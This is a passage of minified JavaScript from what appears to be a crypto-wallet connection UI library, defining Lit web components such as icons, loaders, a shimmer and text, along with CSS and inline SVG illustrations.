h3={allWallets:hy,appStore:py,chromeStore:Ay,apple:my,arrowBottom:gy,arrowLeft:wy,arrowRight:by,arrowTop:yy,browser:vy,checkmark:xy,chevronBottom:_y,chevronLeft:Ey,chevronRight:Cy,chevronTop:Sy,clock:Ty,close:Iy,compass:Oy,coinPlaceholder:$y,copy:Py,cursor:Dy,desktop:Ry,disconnect:Ny,discord:ky,etherscan:My,extension:Uy,externalLink:By,facebook:Ly,filters:jy,github:Fy,google:Wy,helpCircle:zy,infoCircle:Hy,mail:Vy,mobile:Zy,networkPlaceholder:Gy,nftPlaceholder:qy,off:Ky,playStore:Yy,qrCode:Jy,refresh:Xy,search:Qy,swapHorizontal:e3,swapHorizontalBold:t3,swapVertical:n3,telegram:r3,twitch:i3,twitter:o3,twitterIcon:a3,verify:s3,verifyFilled:c3,wallet:u3,walletConnect:d3,walletPlaceholder:l3,warningCircle:f3};let qr=class extends H{constructor(){super(...arguments),this.size="md",this.name="copy",this.color="fg-300"}render(){return this.style.cssText=`
      --local-color: ${`var(--wui-color-${this.color});`}
      --local-width: ${`var(--wui-icon-size-${this.size});`}
    `,$`${h3[this.name]}`}};qr.styles=[pe,Nd,fy];Dc([O()],qr.prototype,"size",void 0);Dc([O()],qr.prototype,"name",void 0);Dc([O()],qr.prototype,"color",void 0);qr=Dc([z("wui-icon")],qr);const p3=q`
  :host {
    display: block;
    width: 100%;
    height: 100%;
  }

  img {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center center;
    border-radius: inherit;
  }
`;var kd=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Bi=class extends H{constructor(){super(...arguments),this.src="./path/to/image.jpg",this.alt="Image"}render(){return $`<img src=${this.src} alt=${this.alt} />`}};Bi.styles=[pe,Nd,p3];kd([O()],Bi.prototype,"src",void 0);kd([O()],Bi.prototype,"alt",void 0);Bi=kd([z("wui-image")],Bi);const m3=q`
  :host {
    display: block;
    width: var(--wui-box-size-lg);
    height: var(--wui-box-size-lg);
  }

  svg {
    width: var(--wui-box-size-lg);
    height: var(--wui-box-size-lg);
    fill: none;
    stroke: transparent;
    stroke-linecap: round;
    transition: all var(--wui-ease-in-power-3) var(--wui-duration-lg);
  }

  use {
    stroke: var(--wui-color-accent-100);
    stroke-width: 2px;
    stroke-dasharray: 54, 118;
    stroke-dashoffset: 172;
    animation: dash 1s linear infinite;
  }

  @keyframes dash {
    to {
      stroke-dashoffset: 0px;
    }
  }
`;var g3=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ks=class extends H{render(){return $`
      <svg viewBox="0 0 54 59">
        <path
          id="wui-loader-path"
          d="M17.22 5.295c3.877-2.277 5.737-3.363 7.72-3.726a11.44 11.44 0 0 1 4.12 0c1.983.363 3.844 1.45 7.72 3.726l6.065 3.562c3.876 2.276 5.731 3.372 7.032 4.938a11.896 11.896 0 0 1 2.06 3.63c.683 1.928.688 4.11.688 8.663v7.124c0 4.553-.005 6.735-.688 8.664a11.896 11.896 0 0 1-2.06 3.63c-1.3 1.565-3.156 2.66-7.032 4.937l-6.065 3.563c-3.877 2.276-5.737 3.362-7.72 3.725a11.46 11.46 0 0 1-4.12 0c-1.983-.363-3.844-1.449-7.72-3.726l-6.065-3.562c-3.876-2.276-5.731-3.372-7.032-4.938a11.885 11.885 0 0 1-2.06-3.63c-.682-1.928-.688-4.11-.688-8.663v-7.124c0-4.553.006-6.735.688-8.664a11.885 11.885 0 0 1 2.06-3.63c1.3-1.565 3.156-2.66 7.032-4.937l6.065-3.562Z"
        />
        <use xlink:href="#wui-loader-path"></use>
      </svg>
    `}};ks.styles=[pe,m3];ks=g3([z("wui-loading-hexagon")],ks);const w3=q`
  :host {
    display: flex;
  }

  :host([data-size='sm']) > svg {
    width: 12px;
    height: 12px;
  }

  :host([data-size='md']) > svg {
    width: 16px;
    height: 16px;
  }

  :host([data-size='lg']) > svg {
    width: 24px;
    height: 24px;
  }

  :host([data-size='xl']) > svg {
    width: 32px;
    height: 32px;
  }

  svg {
    animation: rotate 2s linear infinite;
    transition: all var(--wui-ease-in-power-3) var(--wui-duration-lg);
  }

  circle {
    fill: none;
    stroke: var(--local-color);
    stroke-width: 4px;
    stroke-dasharray: 1, 124;
    stroke-dashoffset: 0;
    stroke-linecap: round;
    animation: dash 1.5s ease-in-out infinite;
  }

  :host([data-size='md']) > svg > circle {
    stroke-width: 6px;
  }

  :host([data-size='sm']) > svg > circle {
    stroke-width: 8px;
  }

  @keyframes rotate {
    100% {
      transform: rotate(360deg);
    }
  }

  @keyframes dash {
    0% {
      stroke-dasharray: 1, 124;
      stroke-dashoffset: 0;
    }

    50% {
      stroke-dasharray: 90, 124;
      stroke-dashoffset: -35;
    }

    100% {
      stroke-dashoffset: -125;
    }
  }
`;var Md=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Li=class extends H{constructor(){super(...arguments),this.color="accent-100",this.size="lg"}render(){return this.style.cssText=`--local-color: var(--wui-color-${this.color});`,this.dataset.size=this.size,$`<svg viewBox="25 25 50 50">
      <circle r="20" cy="50" cx="50"></circle>
    </svg>`}};Li.styles=[pe,w3];Md([O()],Li.prototype,"color",void 0);Md([O()],Li.prototype,"size",void 0);Li=Md([z("wui-loading-spinner")],Li);const b3=q`
  :host {
    display: block;
    width: var(--wui-box-size-md);
    height: var(--wui-box-size-md);
  }

  svg {
    width: var(--wui-box-size-md);
    height: var(--wui-box-size-md);
    transition: all var(--wui-ease-in-power-3) var(--wui-duration-lg);
  }

  rect {
    fill: none;
    stroke: var(--wui-color-accent-100);
    stroke-width: 4px;
    stroke-linecap: round;
    animation: dash 1s linear infinite;
  }

  @keyframes dash {
    to {
      stroke-dashoffset: 0px;
    }
  }
`;var Ip=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let ra=class extends H{constructor(){super(...arguments),this.radius=36}render(){return this.svgLoaderTemplate()}svgLoaderTemplate(){const e=this.radius>50?50:this.radius,r=36-e,o=116+r,i=245+r,a=360+r*1.75;return $`
      <svg viewBox="0 0 110 110" width="110" height="110">
        <rect
          x="2"
          y="2"
          width="106"
          height="106"
          rx=${e}
          stroke-dasharray="${o} ${i}"
          stroke-dashoffset=${a}
        />
      </svg>
    `}};ra.styles=[pe,b3];Ip([O({type:Number})],ra.prototype,"radius",void 0);ra=Ip([z("wui-loading-thumbnail")],ra);const y3=q`
  :host {
    display: block;
    box-shadow: inset 0 0 0 1px var(--wui-gray-glass-005);
    background: linear-gradient(
      120deg,
      var(--wui-color-bg-200) 5%,
      var(--wui-color-bg-200) 48%,
      var(--wui-color-bg-300) 55%,
      var(--wui-color-bg-300) 60%,
      var(--wui-color-bg-300) calc(60% + 10px),
      var(--wui-color-bg-200) calc(60% + 12px),
      var(--wui-color-bg-200) 100%
    );
    background-size: 250%;
    animation: shimmer 3s linear infinite reverse;
  }

  @keyframes shimmer {
    from {
      background-position: -250% 0;
    }
    to {
      background-position: 250% 0;
    }
  }
`;var Rc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Kr=class extends H{constructor(){super(...arguments),this.width="",this.height="",this.borderRadius="m"}render(){return this.style.cssText=`
      width: ${this.width};
      height: ${this.height};
      border-radius: ${`clamp(0px,var(--wui-border-radius-${this.borderRadius}), 40px)`};
    `,$`<slot></slot>`}};Kr.styles=[y3];Rc([O()],Kr.prototype,"width",void 0);Rc([O()],Kr.prototype,"height",void 0);Rc([O()],Kr.prototype,"borderRadius",void 0);Kr=Rc([z("wui-shimmer")],Kr);/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const $p={ATTRIBUTE:1,CHILD:2,PROPERTY:3,BOOLEAN_ATTRIBUTE:4,EVENT:5,ELEMENT:6},Op=t=>(...e)=>({_$litDirective$:t,values:e});let Pp=class{constructor(e){}get _$AU(){return this._$AM._$AU}_$AT(e,n,r){this._$Ct=e,this._$AM=n,this._$Ci=r}_$AS(e,n){return this.update(e,n)}update(e,n){return this.render(...n)}};/**
 * @license
 * Copyright 2018 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const v3=Op(class extends Pp{constructor(t){var e;if(super(t),t.type!==$p.ATTRIBUTE||t.name!=="class"||((e=t.strings)==null?void 0:e.length)>2)throw Error("`classMap()` can only be used in the `class` attribute and must be the only part in the attribute.")}render(t){return" "+Object.keys(t).filter(e=>t[e]).join(" ")+" "}update(t,[e]){var r,o;if(this.it===void 0){this.it=new Set,t.strings!==void 0&&(this.st=new Set(t.strings.join(" ").split(/\s/).filter(i=>i!=="")));for(const i in e)e[i]&&!((r=this.st)!=null&&r.has(i))&&this.it.add(i);return this.render(e)}const n=t.element.classList;for(const i of this.it)i in e||(n.remove(i),this.it.delete(i));for(const i in e){const a=!!e[i];a===this.it.has(i)||(o=this.st)!=null&&o.has(i)||(a?(n.add(i),this.it.add(i)):(n.remove(i),this.it.delete(i)))}return Gr}}),x3=q`
  :host {
    display: flex !important;
  }

  slot {
    display: inline-block;
    font-style: normal;
    font-family: var(--wui-font-family);
    font-feature-settings:
      'tnum' on,
      'lnum' on,
      'case' on;
    line-height: 130%;
    font-weight: var(--wui-font-weight-regular);
    overflow: inherit;
    text-overflow: inherit;
    text-align: var(--local-align);
    color: var(--local-color);
  }

  .wui-font-large-500,
  .wui-font-large-600,
  .wui-font-large-700 {
    font-size: var(--wui-font-size-large);
    letter-spacing: var(--wui-letter-spacing-large);
  }

  .wui-font-paragraph-500,
  .wui-font-paragraph-600,
  .wui-font-paragraph-700 {
    font-size: var(--wui-font-size-paragraph);
    letter-spacing: var(--wui-letter-spacing-paragraph);
  }

  .wui-font-small-400,
  .wui-font-small-500,
  .wui-font-small-600 {
    font-size: var(--wui-font-size-small);
    letter-spacing: var(--wui-letter-spacing-small);
  }

  .wui-font-tiny-500,
  .wui-font-tiny-600 {
    font-size: var(--wui-font-size-tiny);
    letter-spacing: var(--wui-letter-spacing-tiny);
  }

  .wui-font-micro-700,
  .wui-font-micro-600 {
    font-size: var(--wui-font-size-micro);
    letter-spacing: var(--wui-letter-spacing-micro);
    text-transform: uppercase;
  }

  .wui-font-small-400,
  .wui-font-paragraph-400 {
    font-weight: var(--wui-font-weight-light);
  }

  .wui-font-large-700,
  .wui-font-paragraph-700,
  .wui-font-micro-700 {
    font-weight: var(--wui-font-weight-bold);
  }

  .wui-font-large-600,
  .wui-font-paragraph-600,
  .wui-font-small-600,
  .wui-font-tiny-600,
  .wui-font-micro-600 {
    font-weight: var(--wui-font-weight-medium);
  }
`;var Nc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Yr=class extends H{constructor(){super(...arguments),this.variant="paragraph-500",this.color="fg-300",this.align="left"}render(){const e={[`wui-font-${this.variant}`]:!0,[`wui-color-${this.color}`]:!0};return this.style.cssText=`
      --local-align: ${this.align};
      --local-color: var(--wui-color-${this.color});
    `,$`<slot class=${v3(e)}></slot>`}};Yr.styles=[pe,x3];Nc([O()],Yr.prototype,"variant",void 0);Nc([O()],Yr.prototype,"color",void 0);Nc([O()],Yr.prototype,"align",void 0);Yr=Nc([z("wui-text")],Yr);const _3=K`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#1DC956" rx="30" />
  <circle cx="30" cy="30" r="3" fill="#fff" />
  <path
    fill="#2BEE6C"
    stroke="#fff"
    stroke-width="2"
    d="m45.32 17.9-.88-.42.88.42.02-.05c.1-.2.21-.44.26-.7l-.82-.15.82.16a2 2 0 0 0-.24-1.4c-.13-.23-.32-.42-.47-.57a8.42 8.42 0 0 1-.04-.04l-.04-.04a2.9 2.9 0 0 0-.56-.47l-.51.86.5-.86a2 2 0 0 0-1.4-.24c-.26.05-.5.16-.69.26l-.05.02-15.05 7.25-.1.05c-1.14.55-1.85.89-2.46 1.37a7 7 0 0 0-1.13 1.14c-.5.6-.83 1.32-1.38 2.45l-.05.11-7.25 15.05-.02.05c-.1.2-.21.43-.26.69a2 2 0 0 0 .24 1.4l.85-.5-.85.5c.13.23.32.42.47.57l.04.04.04.04c.15.15.34.34.56.47a2 2 0 0 0 1.41.24l-.2-.98.2.98c.25-.05.5-.17.69-.26l.05-.02-.42-.87.42.87 15.05-7.25.1-.05c1.14-.55 1.85-.89 2.46-1.38a7 7 0 0 0 1.13-1.13 12.87 12.87 0 0 0 1.43-2.56l7.25-15.05Z"
  />
  <path
    fill="#1DC956"
    d="M33.38 32.72 30.7 29.3 15.86 44.14l.2.2a1 1 0 0 0 1.14.2l15.1-7.27a3 3 0 0 0 1.08-4.55Z"
  />
  <path
    fill="#86F999"
    d="m26.62 27.28 2.67 3.43 14.85-14.85-.2-.2a1 1 0 0 0-1.14-.2l-15.1 7.27a3 3 0 0 0-1.08 4.55Z"
  />
  <circle cx="30" cy="30" r="3" fill="#fff" transform="rotate(45 30 30)" />
  <rect width="59" height="59" x=".5" y=".5" stroke="#062B2B" stroke-opacity=".1" rx="29.5" />
</svg> `,E3=K`<svg viewBox="0 0 60 60" fill="none">
  <g clip-path="url(#clip0_7734_50402)">
    <path
      d="M0 24.9C0 15.6485 0 11.0228 1.97053 7.56812C3.3015 5.23468 5.23468 3.3015 7.56812 1.97053C11.0228 0 15.6485 0 24.9 0H35.1C44.3514 0 48.9772 0 52.4319 1.97053C54.7653 3.3015 56.6985 5.23468 58.0295 7.56812C60 11.0228 60 15.6485 60 24.9V35.1C60 44.3514 60 48.9772 58.0295 52.4319C56.6985 54.7653 54.7653 56.6985 52.4319 58.0295C48.9772 60 44.3514 60 35.1 60H24.9C15.6485 60 11.0228 60 7.56812 58.0295C5.23468 56.6985 3.3015 54.7653 1.97053 52.4319C0 48.9772 0 44.3514 0 35.1V24.9Z"
      fill="#EB8B47"
    />
    <path
      d="M0.5 24.9C0.5 20.2652 0.50047 16.8221 0.744315 14.105C0.987552 11.3946 1.46987 9.45504 2.40484 7.81585C3.69145 5.56019 5.56019 3.69145 7.81585 2.40484C9.45504 1.46987 11.3946 0.987552 14.105 0.744315C16.8221 0.50047 20.2652 0.5 24.9 0.5H35.1C39.7348 0.5 43.1779 0.50047 45.895 0.744315C48.6054 0.987552 50.545 1.46987 52.1841 2.40484C54.4398 3.69145 56.3086 5.56019 57.5952 7.81585C58.5301 9.45504 59.0124 11.3946 59.2557 14.105C59.4995 16.8221 59.5 20.2652 59.5 24.9V35.1C59.5 39.7348 59.4995 43.1779 59.2557 45.895C59.0124 48.6054 58.5301 50.545 57.5952 52.1841C56.3086 54.4398 54.4398 56.3086 52.1841 57.5952C50.545 58.5301 48.6054 59.0124 45.895 59.2557C43.1779 59.4995 39.7348 59.5 35.1 59.5H24.9C20.2652 59.5 16.8221 59.4995 14.105 59.2557C11.3946 59.0124 9.45504 58.5301 7.81585 57.5952C5.56019 56.3086 3.69145 54.4398 2.40484 52.1841C1.46987 50.545 0.987552 48.6054 0.744315 45.895C0.50047 43.1779 0.5 39.7348 0.5 35.1V24.9Z"
      stroke="#062B2B"
      stroke-opacity="0.1"
    />
    <path
      d="M19 52C24.5228 52 29 47.5228 29 42C29 36.4772 24.5228 32 19 32C13.4772 32 9 36.4772 9 42C9 47.5228 13.4772 52 19 52Z"
      fill="#FF974C"
      stroke="white"
      stroke-width="2"
    />
    <path
      fill-rule="evenodd"
      clip-rule="evenodd"
      d="M42.8437 8.3264C42.4507 7.70891 41.5493 7.70891 41.1564 8.32641L28.978 27.4638C28.5544 28.1295 29.0326 29.0007 29.8217 29.0007H54.1783C54.9674 29.0007 55.4456 28.1295 55.022 27.4638L42.8437 8.3264Z"
      fill="white"
    />
    <path
      fill-rule="evenodd"
      clip-rule="evenodd"
      d="M42.3348 11.6456C42.659 11.7608 42.9061 12.1492 43.4005 12.926L50.7332 24.4488C51.2952 25.332 51.5763 25.7737 51.5254 26.1382C51.4915 26.3808 51.3698 26.6026 51.1833 26.7614C50.9031 27 50.3796 27 49.3327 27H34.6673C33.6204 27 33.0969 27 32.8167 26.7614C32.6302 26.6026 32.5085 26.3808 32.4746 26.1382C32.4237 25.7737 32.7048 25.332 33.2669 24.4488L40.5995 12.926C41.0939 12.1492 41.341 11.7608 41.6652 11.6456C41.8818 11.5687 42.1182 11.5687 42.3348 11.6456ZM35.0001 26.999C38.8661 26.999 42.0001 23.865 42.0001 19.999C42.0001 23.865 45.1341 26.999 49.0001 26.999H35.0001Z"
      fill="#FF974C"
    />
    <path
      d="M10.1061 9.35712C9.9973 9.67775 9.99867 10.0388 9.99978 10.3323C9.99989 10.3611 10 10.3893 10 10.4167V25.5833C10 25.6107 9.99989 25.6389 9.99978 25.6677C9.99867 25.9612 9.9973 26.3222 10.1061 26.6429C10.306 27.2317 10.7683 27.694 11.3571 27.8939C11.6777 28.0027 12.0388 28.0013 12.3323 28.0002C12.3611 28.0001 12.3893 28 12.4167 28H19C24.5228 28 29 23.5228 29 18C29 12.4772 24.5228 8 19 8H12.4167C12.3893 8 12.3611 7.99989 12.3323 7.99978C12.0388 7.99867 11.6778 7.9973 11.3571 8.10614C10.7683 8.306 10.306 8.76834 10.1061 9.35712Z"
      fill="#FF974C"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="19" cy="18" r="4" fill="#EB8B47" stroke="white" stroke-width="2" />
    <circle cx="19" cy="42" r="4" fill="#EB8B47" stroke="white" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="clip0_7734_50402">
      <rect width="60" height="60" fill="white" />
    </clipPath>
  </defs>
</svg> `,C3=K`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <path
      fill="#1DC956"
      d="M0 25.01c0-9.25 0-13.88 1.97-17.33a15 15 0 0 1 5.6-5.6C11.02.11 15.65.11 24.9.11h10.2c9.25 0 13.88 0 17.33 1.97a15 15 0 0 1 5.6 5.6C60 11.13 60 15.76 60 25v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6c-3.45 1.97-8.08 1.97-17.33 1.97H24.9c-9.25 0-13.88 0-17.33-1.97a15 15 0 0 1-5.6-5.6C0 49.1 0 44.46 0 35.21v-10.2Z"
    />
    <path
      fill="#2BEE6C"
      d="M16.1 60c-3.82-.18-6.4-.64-8.53-1.86a15 15 0 0 1-5.6-5.6C.55 50.06.16 46.97.04 41.98L4.2 40.6a4 4 0 0 0 2.48-2.39l4.65-12.4a2 2 0 0 1 2.5-1.2l2.53.84a2 2 0 0 0 2.43-1l2.96-5.94a2 2 0 0 1 3.7.32l3.78 12.58a2 2 0 0 0 3.03 1.09l3.34-2.23a2 2 0 0 0 .65-.7l5.3-9.72a2 2 0 0 1 1.42-1.01l4.14-.69a2 2 0 0 1 1.6.44l3.9 3.24a2 2 0 0 0 2.7-.12l4.62-4.63c.08 2.2.08 4.8.08 7.93v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6c-2.13 1.22-4.7 1.68-8.54 1.86H16.11Z"
    />
    <path
      fill="#fff"
      d="m.07 43.03-.05-2.1 3.85-1.28a3 3 0 0 0 1.86-1.79l4.66-12.4a3 3 0 0 1 3.75-1.8l2.53.84a1 1 0 0 0 1.21-.5l2.97-5.94a3 3 0 0 1 5.56.48l3.77 12.58a1 1 0 0 0 1.51.55l3.34-2.23a1 1 0 0 0 .33-.35l5.3-9.71a3 3 0 0 1 2.14-1.53l4.13-.69a3 3 0 0 1 2.41.66l3.9 3.24a1 1 0 0 0 1.34-.06l5.28-5.28c.05.85.08 1.75.1 2.73L56 22.41a3 3 0 0 1-4.04.19l-3.9-3.25a1 1 0 0 0-.8-.21l-4.13.69a1 1 0 0 0-.72.5l-5.3 9.72a3 3 0 0 1-.97 1.05l-3.34 2.23a3 3 0 0 1-4.53-1.63l-3.78-12.58a1 1 0 0 0-1.85-.16l-2.97 5.94a3 3 0 0 1-3.63 1.5l-2.53-.84a1 1 0 0 0-1.25.6l-4.65 12.4a5 5 0 0 1-3.1 3L.07 43.02Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M49.5 19a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0Z"
      clip-rule="evenodd"
    />
    <path fill="#fff" d="M45 .28v59.66l-2 .1V.19c.7.02 1.37.05 2 .1Z" />
    <path fill="#2BEE6C" d="M47.5 19a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0Z" />
    <path
      stroke="#fff"
      stroke-opacity=".1"
      d="M.5 25.01c0-4.63 0-8.08.24-10.8.25-2.7.73-4.64 1.66-6.28a14.5 14.5 0 0 1 5.42-5.41C9.46 1.58 11.39 1.1 14.1.85A133 133 0 0 1 24.9.61h10.2c4.63 0 8.08 0 10.8.24 2.7.25 4.65.73 6.28 1.67a14.5 14.5 0 0 1 5.42 5.4c.93 1.65 1.41 3.58 1.66 6.3.24 2.71.24 6.16.24 10.79v10.2c0 4.64 0 8.08-.24 10.8-.25 2.7-.73 4.65-1.66 6.28a14.5 14.5 0 0 1-5.42 5.42c-1.63.93-3.57 1.41-6.28 1.66-2.72.24-6.17.24-10.8.24H24.9c-4.63 0-8.08 0-10.8-.24-2.7-.25-4.64-.73-6.28-1.66a14.5 14.5 0 0 1-5.42-5.42C1.47 50.66 1 48.72.74 46.01A133 133 0 0 1 .5 35.2v-10.2Z"
    />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M0 0h60v60H0z" /></clipPath>
  </defs>
</svg>`,S3=K`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#C653C6" rx="30" />
    <path
      fill="#E87DE8"
      d="M57.98.01v19.5a4.09 4.09 0 0 0-2.63 2.29L50.7 34.2a2 2 0 0 1-2.5 1.2l-2.53-.84a2 2 0 0 0-2.42 1l-2.97 5.94a2 2 0 0 1-3.7-.32L32.8 28.6a2 2 0 0 0-3.02-1.09l-3.35 2.23a2 2 0 0 0-.64.7l-5.3 9.72a2 2 0 0 1-1.43 1.01l-4.13.69a2 2 0 0 1-1.61-.44l-3.9-3.24a2 2 0 0 0-2.69.12L2.1 42.93.02 43V.01h57.96Z"
    />
    <path
      fill="#fff"
      d="m61.95 16.94.05 2.1-3.85 1.28a3 3 0 0 0-1.86 1.79l-4.65 12.4a3 3 0 0 1-3.76 1.8l-2.53-.84a1 1 0 0 0-1.2.5l-2.98 5.94a3 3 0 0 1-5.55-.48l-3.78-12.58a1 1 0 0 0-1.5-.55l-3.35 2.23a1 1 0 0 0-.32.35l-5.3 9.72a3 3 0 0 1-2.14 1.52l-4.14.69a3 3 0 0 1-2.41-.66l-3.9-3.24a1 1 0 0 0-1.34.06l-5.28 5.28c-.05-.84-.08-1.75-.1-2.73l3.97-3.96a3 3 0 0 1 4.04-.19l3.89 3.25a1 1 0 0 0 .8.21l4.14-.68a1 1 0 0 0 .71-.51l5.3-9.71a3 3 0 0 1 .97-1.06l3.34-2.23a3 3 0 0 1 4.54 1.63l3.77 12.58a1 1 0 0 0 1.86.16l2.96-5.93a3 3 0 0 1 3.64-1.5l2.52.83a1 1 0 0 0 1.25-.6l4.66-12.4a5 5 0 0 1 3.1-2.99l4.43-1.48Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M35.5 27a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0Z"
      clip-rule="evenodd"
    />
    <path fill="#fff" d="M31 0v60h-2V0h2Z" />
    <path fill="#E87DE8" d="M33.5 27a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0Z" />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg> `,A3=K`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#987DE8" rx="30" />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="m15.48 28.37 11.97-19.3a3 3 0 0 1 5.1 0l11.97 19.3a6 6 0 0 1 .9 3.14v.03a6 6 0 0 1-1.16 3.56L33.23 50.2a4 4 0 0 1-6.46 0L15.73 35.1a6 6 0 0 1-1.15-3.54v-.03a6 6 0 0 1 .9-3.16Z"
      clip-rule="evenodd"
    />
    <path
      fill="#643CDD"
      d="M30.84 10.11a1 1 0 0 0-.84-.46V24.5l12.6 5.53a2 2 0 0 0-.28-1.4L30.84 10.11Z"
    />
    <path
      fill="#BDADEB"
      d="M30 9.65a1 1 0 0 0-.85.46L17.66 28.64a2 2 0 0 0-.26 1.39L30 24.5V9.65Z"
    />
    <path
      fill="#643CDD"
      d="M30 50.54a1 1 0 0 0 .8-.4l11.24-15.38c.3-.44-.2-1-.66-.73l-9.89 5.68a3 3 0 0 1-1.5.4v10.43Z"
    />
    <path
      fill="#BDADEB"
      d="m17.97 34.76 11.22 15.37c.2.28.5.41.8.41V40.11a3 3 0 0 1-1.49-.4l-9.88-5.68c-.47-.27-.97.3-.65.73Z"
    />
    <path
      fill="#401AB3"
      d="M42.6 30.03 30 24.5v13.14a3 3 0 0 0 1.5-.4l10.14-5.83a2 2 0 0 0 .95-1.38Z"
    />
    <path
      fill="#7C5AE2"
      d="M30 37.64V24.46l-12.6 5.57a2 2 0 0 0 .97 1.39l10.13 5.82a3 3 0 0 0 1.5.4Z"
    />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg> `,T3=K`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#1DC956" rx="3" />
  <path
    fill="#1FAD7E"
    stroke="#fff"
    stroke-width="2"
    d="m30.49 29.13-.49-.27-.49.27-12.77 7.1-.05.02c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45l-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-12.77-7.1Z"
  />
  <path
    fill="#2BEE6C"
    stroke="#fff"
    stroke-width="2"
    d="m30.49 19.13-.49-.27-.49.27-12.77 7.1-.05.02c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45l-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-12.77-7.1Z"
  />
  <path
    fill="#86F999"
    stroke="#fff"
    stroke-width="2"
